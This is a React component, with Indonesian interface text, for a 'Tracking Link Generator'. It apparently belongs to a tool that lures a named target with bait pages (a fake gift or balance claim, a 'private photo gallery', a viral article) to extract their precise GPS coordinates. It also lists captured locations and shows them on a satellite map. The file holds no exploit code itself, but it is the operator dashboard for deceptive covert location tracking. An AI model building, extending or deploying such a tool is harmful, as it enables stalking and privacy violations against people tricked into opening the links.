'use client';

import { useState, useEffect } from 'react';
import { TrackingLink, LocationCapture } from '@/lib/storage';
import DynamicMap from './DynamicMap';

export default function TrackingManager() {
    const [label, setLabel] = useState('');
    const [template, setTemplate] = useState('gift');
    const [loading, setLoading] = useState(false);
    const [links, setLinks] = useState<TrackingLink[]>([]);
    const [captures, setCaptures] = useState<LocationCapture[]>([]);
    const [error, setError] = useState('');
    const [success, setSuccess] = useState('');

    const fetchResults = async () => {
        try {
            const res = await fetch('/api/track/results');
            if (res.ok) {
                const data = await res.json();
                setLinks(data.links || []);
                setCaptures(data.captures || []);
            }
        } catch {
            console.error('Failed to fetch tracking data');
        }
    };

    useEffect(() => {
        fetchResults();
        // Auto refresh every 10 seconds
        const interval = setInterval(fetchResults, 10000);
        return () => clearInterval(interval);
    }, []);

    const handleCreateLink = async (e: React.FormEvent) => {
        e.preventDefault();
        setLoading(true);
        setError('');
        setSuccess('');

        if (!label) {
            setError('Masukkan nama/label target.');
            setLoading(false);
            return;
        }

        try {
            const res = await fetch('/api/track/create', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ label, template }),
            });

            const data = await res.json();

            if (res.ok) {
                setSuccess('Link tracking berhasil dibuat!');
                setLabel('');
                fetchResults();
            } else {
                setError(data.error || 'Gagal membuat link.');
            }
        } catch {
            setError('Terjadi kesalahan jaringan.');
        } finally {
            setLoading(false);
        }
    };

    const copyToClipboard = (id: string) => {
        const url = `${window.location.origin}/t/${id}`;
        navigator.clipboard.writeText(url);
        alert('Link disalin ke clipboard!');
    };

    return (
        <div className="animate-fade-in">
            <div className="glass-card" style={{ marginBottom: '32px' }}>
                <h2 className="heading" style={{ fontSize: '1.8rem', marginBottom: '8px' }}>Tracking Link Generator</h2>
                <p className="subheading" style={{ marginBottom: '32px' }}>Pancing target dengan link khusus untuk mengekstraksi titik koordinat GPS secara presisi.</p>

                <form onSubmit={handleCreateLink} style={{ display: 'grid', gridTemplateColumns: '1fr 1fr auto', gap: '20px', alignItems: 'end' }}>
                    <div>
                        <label className="label">Identitas Target / Label</label>
                        <input
                            type="text"
                            className="input-field"
                            value={label}
                            onChange={(e) => setLabel(e.target.value)}
                            placeholder="Contoh: Penipu A"
                        />
                    </div>

                    <div>
                        <label className="label">Metode Ekstraksi (Umpan)</label>
                        <select
                            className="input-field"
                            value={template}
                            onChange={(e) => setTemplate(e.target.value)}
                            style={{ cursor: 'pointer' }}
                        >
                            <option value="gift">🎁 Klaim Saldo / Hadiah</option>
                            <option value="photo">📸 Galeri Foto Pribadi</option>
                            <option value="article">📰 Artikel Berita Viral</option>
                        </select>
                    </div>

                    <button type="submit" className="btn-primary" disabled={loading} style={{ height: '52px', minWidth: '180px' }}>
                        {loading ? 'Processing...' : 'Generate Tautan'}
                    </button>
                </form>

                {error && (
                    <div style={{ marginTop: '20px', padding: '12px 16px', borderRadius: '8px', background: 'rgba(255, 77, 77, 0.1)', border: '1px solid rgba(255, 77, 77, 0.2)', display: 'flex', alignItems: 'center', gap: '8px' }} className="animate-fade-in">
                        <span style={{ color: 'var(--error-color)' }}>⚠️</span>
                        <p style={{ color: 'var(--error-color)', fontSize: '14px', margin: 0 }}>{error}</p>
                    </div>
                )}
                {success && (
                    <div style={{ marginTop: '20px', padding: '12px 16px', borderRadius: '8px', background: 'rgba(46, 160, 67, 0.1)', border: '1px solid rgba(46, 160, 67, 0.2)', display: 'flex', alignItems: 'center', gap: '8px' }} className="animate-fade-in">
                        <span style={{ color: 'var(--success-color)' }}>✅</span>
                        <p style={{ color: 'var(--success-color)', fontSize: '14px', margin: 0 }}>{success}</p>
                    </div>
                )}
            </div>

            <div className="glass-card">
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '24px' }}>
                    <h3 style={{ fontSize: '1.4rem', color: '#fff', display: 'flex', alignItems: 'center', gap: '12px' }}>
                        <span style={{ color: 'var(--accent-cyan)' }}>🔗</span> Daftar Link Aktif
                    </h3>
                    <div className="badge" style={{ background: 'rgba(255,255,255,0.05)', color: 'var(--text-secondary)' }}>
                        Total: {links.length} Tautan
                    </div>
                </div>

                {links.length === 0 ? (
                    <div style={{ padding: '40px 20px', textAlign: 'center', background: 'rgba(0,0,0,0.2)', borderRadius: '12px', border: '1px dashed rgba(255,255,255,0.1)' }}>
                        <p style={{ color: 'var(--text-secondary)' }}>Belum ada link pelacakan yang dibuat.</p>
                    </div>
                ) : (
                    <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(340px, 1fr))', gap: '20px' }}>
                        {links.slice().reverse().map((link) => {
                            const linkCaptures = captures.filter(c => c.linkId === link.id);

                            return (
                                <div key={link.id} className="list-item" style={{ flexDirection: 'column', gap: '20px' }}>
                                    <div style={{ width: '100%' }}>
                                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: '12px' }}>
                                            <h4 style={{ color: '#fff', fontSize: '1.1rem', fontWeight: '600' }}>{link.label}</h4>
                                            {linkCaptures.length > 0 ? (
                                                <span className="badge badge-success">Tertangkap ({linkCaptures.length})</span>
                                            ) : (
                                                <span className="badge badge-pending">Menunggu Target</span>
                                            )}
                                        </div>

                                        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px', marginBottom: '16px' }}>
                                            <div>
                                                <span style={{ fontSize: '12px', color: 'var(--text-secondary)', display: 'block', marginBottom: '2px' }}>Metode</span>
                                                <span style={{ fontSize: '13px', color: '#e6edf3' }}>{link.template}</span>
                                            </div>
                                            <div>
                                                <span style={{ fontSize: '12px', color: 'var(--text-secondary)', display: 'block', marginBottom: '2px' }}>Dibuat Pada</span>
                                                <span style={{ fontSize: '13px', color: '#e6edf3' }}>{new Date(link.createdAt).toLocaleDateString()}</span>
                                            </div>
                                        </div>
                                    </div>

                                    <button
                                        onClick={() => copyToClipboard(link.id)}
                                        className="btn-secondary"
                                        style={{ width: '100%', display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '8px' }}
                                    >
                                        <span>📋</span> Salin Link Pelacakan
                                    </button>
                                </div>
                            );
                        })}
                    </div>
                )}
            </div>

            {captures.length > 0 && (
                <div className="glass-card animate-fade-in stagger-3" style={{ marginTop: '32px' }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '24px' }}>
                        <h3 style={{ fontSize: '1.4rem', color: '#fff', display: 'flex', alignItems: 'center', gap: '12px' }}>
                            <span style={{ color: 'var(--accent-cyan)' }}>🗺️</span> Pemetaan Satelit
                        </h3>
                        <div className="badge badge-success">
                            {captures.length} Titik Koordinat
                        </div>
                    </div>

                    <div style={{ position: 'relative', borderRadius: '16px', overflow: 'hidden', border: '1px solid rgba(0, 240, 255, 0.2)', boxShadow: '0 0 30px rgba(0, 240, 255, 0.1)' }}>
                        <DynamicMap captures={captures} />
                    </div>
                </div>
            )}
        </div>
    );
}
